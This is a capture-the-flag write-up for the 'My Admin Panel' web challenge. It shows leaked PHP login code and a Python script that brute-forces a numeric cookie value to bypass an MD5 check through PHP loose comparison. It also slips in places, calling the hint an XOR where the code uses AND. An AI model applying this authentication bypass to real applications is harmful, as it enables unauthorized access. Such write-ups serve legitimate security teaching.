# CONfidenceCTF write-ups

**Author:** Kaushik S Kalmady, Rakshith G

## Web - My Admin Panel

We can download a `login.php.bak` file which contains the php code that runs at the `/login.php` endpoint.
```php
<?php

include '../func.php';
include '../config.php';

if (!$_COOKIE['otadmin']) {
    exit("Not authenticated.\n");
}

if (!preg_match('/^{"hash": [0-9A-Z\"]+}$/', $_COOKIE['otadmin'])) {
    echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n";
    exit();
}

$session_data = json_decode($_COOKIE['otadmin'], true);

if ($session_data === NULL) { echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n"; exit(); }

if ($session_data['hash'] != strtoupper(MD5($cfg_pass))) {
    echo("I CAN EVEN GIVE YOU A HINT XD \n");

    for ($i = 0; i < strlen(MD5('xDdddddd')); i++) {
        echo(ord(MD5($cfg_pass)[$i]) & 0xC0);
    }

    exit("\n");
}

display_admin();
```

Here are the things we can ascertain:
  - We need to send a cookie named `otadmin`
  - The cookie needs to be a valid json with a key field "hash"
  - The value field needs to match the regex `'/^{"hash": [0-9A-Z\"]+}$/'`, a hex with numbers and uppercase letter, can be enclosed in quotes
  - The value field has to match the `md5($cfg_pass)`

We are given some additional info though. If the payload we send doesn't match the md5, we are given a hint, which is the XOR of each character in the intended md5 with `0xC0`. This will actually be `0` where there are numbers, and `64` where character is a uppercase letter.

Let's send a sample payload
```python
>>> url = "https://gameserver.zajebistyc.tf/admin/login.php?"
>>> cookie = {"otadmin" : '{"hash" : "aaaaaaaaaaaaaaaa"}'}
>>> request.get(url, cookies=cookie).text
'I CAN EVEN GIVE YOU A HINT XD \n0006464640640064000646464640006400640640646400\n'
```

We can see that the xored string contains three 0s in the beginning and is followed by some uppercase letters.

Let's go back to the code now.
`$session_data['hash'] != strtoupper(MD5($cfg_pass)`

The comparison used is `!=`. If you read up about comparisons in php you'll find that `!=` is a type of weak comparison, where the LHS and RHS need not be of the same type. If  string and number are compared, then the string is first converted to number and then the comparison is done.

For e.g,
```php
0 != "1"  # True
0 != "0"  # False
```

Also during this string conversion to number, the characters starting from the first non numeric character are ignored. So `"123abc12"` becomes `123`. There's our exploit!

Remember that the md5 string contains three letters in the beginning followed by some characters, so if we pass the payload as a number, php will convert the md5 string to the number equivalent to first three chars and compare it with our payload. This means that we can now bruteforce this! 

This will be possible because as per the regex, we need not enclose the value field in the json with quotes, meaning we can send a number.

Here is the code to get the flag:
```python
def breakphp():
    url = "https://gameserver.zajebistyc.tf/admin/login.php?"
    default = 'I CAN EVEN GIVE YOU A HINT XD \n0006464640640064000646464640006400640640646400\n'

    # First three chars are numbers, then text
    # If our json payload is a number that matches the first three digits of md5
    # The != condition will be bypassed

    nums = "0123456789"
    
    # The regex is '/^{"hash": [0-9A-Z\"]+}$/'
    # Therefore we can send a number in the json payload, need not be string
    
    for i in nums[1:]: # json doesn't decode if the first digit is 0
        for j in nums:
            for k in nums:
                val = i + j + k
                cookie = {"otadmin" : '{"hash": ' + val + '}'}
                res = requests.get(url, cookies=cookie).text
                if res != default:
                    print(cookie)
                    print(res)
                    return

breakphp()
```

> Congratulations! p4{wtf_php_comparisons_how_do_they_work}


